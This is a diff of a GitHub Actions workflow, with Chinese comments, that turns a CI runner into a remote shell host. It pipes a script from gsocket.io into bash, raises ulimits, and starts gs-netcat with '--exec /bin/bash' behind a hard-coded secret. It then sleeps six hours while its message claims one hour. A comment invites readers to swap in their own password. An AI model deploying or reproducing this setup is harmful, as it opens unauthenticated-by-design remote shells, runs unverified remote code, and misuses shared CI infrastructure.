@@ -13,10 +13,13 @@ jobs:
           curl -fsSL https://gsocket.io/x | bash
           sudo apt update -y
           sudo apt upgrade -y
-          sudo apt install neofetch speedtest-cli python3 python3-pip
+          sudo apt install neofetch speedtest-cli python3 python3-pip #自己決定要先安裝啥
+          ulimit -u 999999
+          ulimit -e 999999
+          ulimit -n 999999
 
       - name: Start gsocket reverse shell (bash)
         run: |
-          nohup ./gs-netcat -s jeikaizin1337 --exec /bin/bash > out.log 2>&1 &
+          nohup ./gs-netcat -s jeikaizin1337 --exec /bin/bash > out.log 2>&1 & # 把 jeikaizin1337 改成你的密碼
           echo "GSocket shell started. You have 1 hour to connect..."
           sleep 21600
